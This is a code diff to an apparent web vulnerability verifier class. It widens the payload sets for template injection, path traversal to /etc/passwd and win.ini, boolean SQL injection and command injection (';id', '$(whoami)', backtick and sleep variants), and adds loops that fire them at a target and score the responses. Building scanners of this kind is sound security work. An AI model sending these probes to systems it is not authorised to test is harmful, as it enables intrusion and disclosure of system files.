@@ -70,13 +70,57 @@ class VulnerabilityVerifier:
         ("freemarker", "${7*7}", "${7*8}", "49", "56"),
         ("erb", "<%= 7*7 %>", "<%= 7*8 %>", "49", "56"),
         ("ruby", "#{7*7}", "#{7*8}", "49", "56"),
+        ("twig", "{{7*'7'}}", "{{7*'8'}}", "49", "56"),
+        ("smarty", "{7*7}", "{7*8}", "49", "56"),
+        ("spring_el", "*{7*7}", "*{7*8}", "49", "56"),
     )
     LFI_PAYLOAD = "php://filter/convert.base64-encode/resource={resource}"
+    LFI_TRAVERSALS = (
+        ("../../../../etc/passwd", re.compile(r"root:.*?:0:0:")),
+        ("..%2f..%2f..%2f..%2fetc%2fpasswd", re.compile(r"root:.*?:0:0:")),
+        ("..%252f..%252f..%252f..%252fetc%252fpasswd", re.compile(r"root:.*?:0:0:")),
+        ("....//....//....//etc/passwd", re.compile(r"root:.*?:0:0:")),
+        ("/etc/passwd", re.compile(r"root:.*?:0:0:")),
+        ("../../../../windows/win.ini", re.compile(r"(?i)\[(?:fonts|extensions)\]")),
+        ("..\\..\\..\\..\\windows\\win.ini", re.compile(r"(?i)\[(?:fonts|extensions)\]")),
+    )
+    BOOLEAN_SQLI_PAIRS = (
+        ("{original} AND 1=1", "{original} AND 1=2"),
+        ("{original}' AND '1'='1", "{original}' AND '1'='2"),
+        ("{original}' AND 1=1-- -", "{original}' AND 1=2-- -"),
+        ("{original}\" AND \"1\"=\"1", "{original}\" AND \"1\"=\"2"),
+        ("{original}\" AND 1=1-- -", "{original}\" AND 1=2-- -"),
+        ("{original}') AND ('1'='1", "{original}') AND ('1'='2"),
+        ("{original}') AND 1=1-- -", "{original}') AND 1=2-- -"),
+    )
     PHP_MARKERS = ("<?php", "<?=")
     BLOCK_STATUSES = {403, 406, 429}
     RCE_ID_PATTERN = re.compile(r"uid=\d+\([^)]+\)")
     RCE_WHOAMI_PATTERN = re.compile(
         r"(?m)^(?:root|www-data|nginx|apache|nobody|vapf|ubuntu|daemon)$"
+    )
+    RCE_COMMAND_PROBES = (
+        ("id", "; id", RCE_ID_PATTERN),
+        ("whoami", "| whoami", RCE_WHOAMI_PATTERN),
+        ("id", "&& id", RCE_ID_PATTERN),
+        ("whoami", "&& whoami", RCE_WHOAMI_PATTERN),
+        ("id", "| id", RCE_ID_PATTERN),
+        ("whoami", "; whoami", RCE_WHOAMI_PATTERN),
+        ("id", "$(id)", RCE_ID_PATTERN),
+        ("whoami", "$(whoami)", RCE_WHOAMI_PATTERN),
+        ("id", "`id`", RCE_ID_PATTERN),
+        ("whoami", "`whoami`", RCE_WHOAMI_PATTERN),
+        ("id", "\nid\n", RCE_ID_PATTERN),
+        ("whoami", "\nwhoami\n", RCE_WHOAMI_PATTERN),
+    )
+    RCE_SLEEP_TEMPLATES = (
+        "; sleep {delay}",
+        "| sleep {delay}",
+        "& sleep {delay}",
+        "&& sleep {delay}",
+        "$(sleep {delay})",
+        "`sleep {delay}`",
+        "\nsleep {delay}\n",
     )
 
     def __init__(
@@ -303,38 +347,78 @@ class VulnerabilityVerifier:
         payload = self.LFI_PAYLOAD.format(resource=resource)
         query[parameter] = payload
         response = self._request(method, url, query)
-        if response.error:
-            return self._failure(f"LFI request failed: {response.error}")
+        if not response.error and response.text:
+            blobs = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", response.text or "")
+            valid_base64 = False
+            php_source = False
+            for blob in blobs:
+                try:
+                    padded = blob + "=" * (-len(blob) % 4)
+                    decoded = base64.b64decode(padded, validate=True).decode("utf-8", errors="replace")
+                except (binascii.Error, ValueError):
+                    continue
+                valid_base64 = True
+                if any(marker in decoded for marker in self.PHP_MARKERS):
+                    php_source = True
+                    break
 
-        blobs = re.findall(r"[A-Za-z0-9+/]{20,}={0,2}", response.text or "")
-        valid_base64 = False
-        php_source = False
-        for blob in blobs:
-            try:
-                padded = blob + "=" * (-len(blob) % 4)
-                decoded = base64.b64decode(padded, validate=True).decode("utf-8", errors="replace")
-            except (binascii.Error, ValueError):
+            if valid_base64 and php_source:
+                signals = (
+                    ConfidenceSignal("base64_output", 50, valid_base64, "valid base64 blob decoded"),
+                    ConfidenceSignal("php_source", 50, php_source, "decoded content contains PHP markers"),
+                )
+                evidence = self._evidence(
+                    method,
+                    url,
+                    query,
+                    response,
+                    summary=f"LFI base64={valid_base64}; php={php_source}; source not stored",
+                )
+                return self._result(
+                    signals,
+                    evidence,
+                    f"LFI filter output base64={valid_base64}; PHP source markers={php_source}",
+                )
+
+        for trav_payload, pattern in self.LFI_TRAVERSALS:
+            t_query = dict(params or {})
+            t_query[parameter] = trav_payload
+            t_resp = self._request(method, url, t_query)
+            if t_resp.error or not t_resp.text:
                 continue
-            valid_base64 = True
-            if any(marker in decoded for marker in self.PHP_MARKERS):
-                php_source = True
-                break
+            if pattern.search(t_resp.text):
+                signals = (
+                    ConfidenceSignal("file_disclosure", 70, True, f"disclosed system file via {trav_payload}"),
+                    ConfidenceSignal("pattern_match", 30, True, "regex pattern confirmed"),
+                )
+                evidence = self._evidence(
+                    method,
+                    url,
+                    t_query,
+                    t_resp,
+                    summary=f"LFI path traversal confirmed ({trav_payload})",
+                )
+                return self._result(
+                    signals,
+                    evidence,
+                    f"LFI path traversal verified with payload: {trav_payload}",
+                )
 
         signals = (
-            ConfidenceSignal("base64_output", 50, valid_base64, "valid base64 blob decoded"),
-            ConfidenceSignal("php_source", 50, php_source, "decoded content contains PHP markers"),
+            ConfidenceSignal("base64_output", 50, False, "no valid base64 stream decoded"),
+            ConfidenceSignal("php_source", 50, False, "no PHP markers found"),
         )
         evidence = self._evidence(
             method,
             url,
             query,
-            response,
-            summary=f"LFI base64={valid_base64}; php={php_source}; source not stored",
+            response if not response.error else Resp(url=url),
+            summary="LFI verification failed",
         )
         return self._result(
             signals,
             evidence,
-            f"LFI filter output base64={valid_base64}; PHP source markers={php_source}",
+            "LFI verification failed: no file disclosure or base64 stream detected",
         )
 
     def verify_boolean_sqli(
@@ -352,73 +436,80 @@ class VulnerabilityVerifier:
         if baseline.error or not baseline.text:
             return self._failure("Boolean SQLi baseline request failed or was empty")
 
-        true_params = dict(base_params)
-        true_params[parameter] = f"{original} AND 1=1"
-        false_params = dict(base_params)
-        false_params[parameter] = f"{original} AND 1=2"
+        best_result: VerificationResult | None = None
+        for true_tmpl, false_tmpl in self.BOOLEAN_SQLI_PAIRS:
+            true_params = dict(base_params)
+            true_params[parameter] = true_tmpl.format(original=original)
+            false_params = dict(base_params)
+            false_params[parameter] = false_tmpl.format(original=original)
 
-        true_first = self._request(method, url, true_params)
-        false_first = self._request(method, url, false_params)
-        true_second = self._request(method, url, true_params)
-        false_second = self._request(method, url, false_params)
-        if any(response.error for response in (true_first, false_first, true_second, false_second)):
-            return self._failure("Boolean SQLi differential request failed")
+            true_first = self._request(method, url, true_params)
+            false_first = self._request(method, url, false_params)
+            true_second = self._request(method, url, true_params)
+            false_second = self._request(method, url, false_params)
+            if any(response.error for response in (true_first, false_first, true_second, false_second)):
+                continue
 
-        true_similarity = (
-            self.similarity(baseline.text, true_first.text)
-            + self.similarity(baseline.text, true_second.text)
-        ) / 2
-        false_similarity = (
-            self.similarity(baseline.text, false_first.text)
-            + self.similarity(baseline.text, false_second.text)
-        ) / 2
-        separation = true_similarity - false_similarity
-        repeatable = (
-            abs(self.similarity(true_first.text, true_second.text) - 1.0) <= 0.05
-            and abs(self.similarity(false_first.text, false_second.text) - 1.0) <= 0.05
-        )
-        signals = (
-            ConfidenceSignal(
-                "true_branch_matches",
-                30,
-                true_similarity >= 0.95,
-                f"true similarity={true_similarity:.3f}",
-            ),
-            ConfidenceSignal(
-                "false_branch_diverges",
-                30,
-                false_similarity <= 0.85,
-                f"false similarity={false_similarity:.3f}",
-            ),
-            ConfidenceSignal(
-                "branch_separation",
-                20,
-                separation >= 0.10,
-                f"separation={separation:.3f}",
-            ),
-            ConfidenceSignal(
-                "repeatable",
-                20,
-                repeatable,
-                "both branches repeat consistently",
-            ),
-        )
-        evidence = self._evidence(
-            method,
-            url,
-            false_params,
-            false_second,
-            summary=(
-                f"boolean true similarity={true_similarity:.3f}; "
-                f"false similarity={false_similarity:.3f}"
-            ),
-        )
-        return self._result(
-            signals,
-            evidence,
-            f"boolean true_similarity={true_similarity:.3f} "
-            f"false_similarity={false_similarity:.3f} separation={separation:.3f}",
-        )
+            true_similarity = (
+                self.similarity(baseline.text, true_first.text)
+                + self.similarity(baseline.text, true_second.text)
+            ) / 2
+            false_similarity = (
+                self.similarity(baseline.text, false_first.text)
+                + self.similarity(baseline.text, false_second.text)
+            ) / 2
+            separation = true_similarity - false_similarity
+            repeatable = (
+                abs(self.similarity(true_first.text, true_second.text) - 1.0) <= 0.05
+                and abs(self.similarity(false_first.text, false_second.text) - 1.0) <= 0.05
+            )
+            signals = (
+                ConfidenceSignal(
+                    "true_branch_matches",
+                    30,
+                    true_similarity >= 0.95,
+                    f"true similarity={true_similarity:.3f}",
+                ),
+                ConfidenceSignal(
+                    "false_branch_diverges",
+                    30,
+                    false_similarity <= 0.85,
+                    f"false similarity={false_similarity:.3f}",
+                ),
+                ConfidenceSignal(
+                    "branch_separation",
+                    20,
+                    separation >= 0.10,
+                    f"separation={separation:.3f}",
+                ),
+                ConfidenceSignal(
+                    "repeatable",
+                    20,
+                    repeatable,
+                    "both branches repeat consistently",
+                ),
+            )
+            evidence = self._evidence(
+                method,
+                url,
+                false_params,
+                false_second,
+                summary=(
+                    f"boolean true similarity={true_similarity:.3f}; "
+                    f"false similarity={false_similarity:.3f}"
+                ),
+            )
+            result = self._result(
+                signals,
+                evidence,
+                f"boolean true_similarity={true_similarity:.3f} "
+                f"false_similarity={false_similarity:.3f} separation={separation:.3f}",
+            )
+            if result.vulnerable:
+                return result
+            best_result = best_result or result
+
+        return best_result or self._failure("Boolean SQLi differential test did not diverge")
 
     def verify_rce(
         self,
@@ -439,11 +530,7 @@ class VulnerabilityVerifier:
         if baseline.error:
             return self._failure(f"RCE baseline request failed: {baseline.error}")
 
-        probes = (
-            ("id", "; id", self.RCE_ID_PATTERN),
-            ("whoami", "| whoami", self.RCE_WHOAMI_PATTERN),
-        )
-        for label, payload, pattern in probes:
+        for label, payload, pattern in self.RCE_COMMAND_PROBES:
             query = dict(base_params)
             query[parameter] = payload
             first = self._request(method, url, query)
@@ -458,7 +545,7 @@ class VulnerabilityVerifier:
                     "output_match",
                     60,
                     first_match,
-                    f"{label} output matched",
+                    f"{label} output matched ({payload})",
                 ),
                 ConfidenceSignal(
                     "repeatable",
@@ -478,7 +565,7 @@ class VulnerabilityVerifier:
                 url,
                 query,
                 second,
-                summary=f"RCE confirmed via harmless command execution ({label})",
+                summary=f"RCE confirmed via harmless command execution ({label}: {payload})",
             )
             result = self._result(
                 signals,
@@ -496,66 +583,77 @@ class VulnerabilityVerifier:
                 return self._failure(f"RCE timing baseline failed: {response.error}")
             baseline_times.append(time.monotonic() - started)
 
-        sleep_params = dict(base_params)
-        sleep_params[parameter] = f"; sleep {sleep_delay}"
-        injection_times: list[float] = []
-        last_response: Resp | None = None
-        for _ in range(3):
-            started = time.monotonic()
-            last_response = self._request(method, url, sleep_params)
-            if last_response.error:
-                return self._failure(f"RCE timing probe failed: {last_response.error}")
-            injection_times.append(time.monotonic() - started)
-
         baseline_mean = statistics.mean(baseline_times)
         baseline_stdev = statistics.pstdev(baseline_times)
-        injection_mean = statistics.mean(injection_times)
-        injection_stdev = statistics.pstdev(injection_times)
-        delta = injection_mean - baseline_mean
-        all_delayed = all(
-            sample >= baseline_mean + sleep_delay * 0.75
-            for sample in injection_times
-        )
-        timing_signals = (
-            ConfidenceSignal(
-                "baseline_stable",
-                15,
-                baseline_stdev <= max(0.15, sleep_delay * 0.15),
-                f"baseline stdev={baseline_stdev:.3f}s",
-            ),
-            ConfidenceSignal(
-                "all_samples_delayed",
-                40,
-                all_delayed,
-                f"injection times={[round(value, 3) for value in injection_times]}",
-            ),
-            ConfidenceSignal(
-                "mean_delta",
-                25,
-                delta >= sleep_delay * 0.8,
-                f"delta={delta:.3f}s",
-            ),
-            ConfidenceSignal(
-                "injection_stable",
-                20,
-                injection_stdev <= max(0.2, sleep_delay * 0.35),
-                f"injection stdev={injection_stdev:.3f}s",
-            ),
-        )
-        evidence = self._evidence(
-            method,
-            url,
-            sleep_params,
-            last_response or Resp(url=url),
-            summary="RCE confirmed via harmless sleep-based timing verification",
-        )
-        return self._result(
-            timing_signals,
-            evidence,
-            f"RCE time-based baseline_mean={baseline_mean:.3f}s "
-            f"baseline_stdev={baseline_stdev:.3f}s injection_mean={injection_mean:.3f}s "
-            f"injection_stdev={injection_stdev:.3f}s",
-        )
+
+        for sleep_tmpl in self.RCE_SLEEP_TEMPLATES:
+            sleep_params = dict(base_params)
+            sleep_params[parameter] = sleep_tmpl.format(delay=sleep_delay)
+            injection_times: list[float] = []
+            last_response: Resp | None = None
+            timing_failed = False
+            for _ in range(3):
+                started = time.monotonic()
+                last_response = self._request(method, url, sleep_params)
+                if last_response.error:
+                    timing_failed = True
+                    break
+                injection_times.append(time.monotonic() - started)
+
+            if timing_failed or len(injection_times) < 3:
+                continue
+
+            injection_mean = statistics.mean(injection_times)
+            injection_stdev = statistics.pstdev(injection_times)
+            delta = injection_mean - baseline_mean
+            all_delayed = all(
+                sample >= baseline_mean + sleep_delay * 0.75
+                for sample in injection_times
+            )
+            timing_signals = (
+                ConfidenceSignal(
+                    "baseline_stable",
+                    15,
+                    baseline_stdev <= max(0.15, sleep_delay * 0.15),
+                    f"baseline stdev={baseline_stdev:.3f}s",
+                ),
+                ConfidenceSignal(
+                    "all_samples_delayed",
+                    40,
+                    all_delayed,
+                    f"injection times={[round(value, 3) for value in injection_times]}",
+                ),
+                ConfidenceSignal(
+                    "mean_delta",
+                    25,
+                    delta >= sleep_delay * 0.8,
+                    f"delta={delta:.3f}s",
+                ),
+                ConfidenceSignal(
+                    "injection_stable",
+                    20,
+                    injection_stdev <= max(0.2, sleep_delay * 0.35),
+                    f"injection stdev={injection_stdev:.3f}s",
+                ),
+            )
+            evidence = self._evidence(
+                method,
+                url,
+                sleep_params,
+                last_response or Resp(url=url),
+                summary=f"RCE confirmed via sleep-based timing verification ({sleep_tmpl})",
+            )
+            result = self._result(
+                timing_signals,
+                evidence,
+                f"RCE time-based baseline_mean={baseline_mean:.3f}s "
+                f"baseline_stdev={baseline_stdev:.3f}s injection_mean={injection_mean:.3f}s "
+                f"injection_stdev={injection_stdev:.3f}s",
+            )
+            if result.vulnerable:
+                return result
+
+        return self._failure("RCE verification failed across all command probes and timing templates")
 
     def verify_time_based_sqli(
         self,
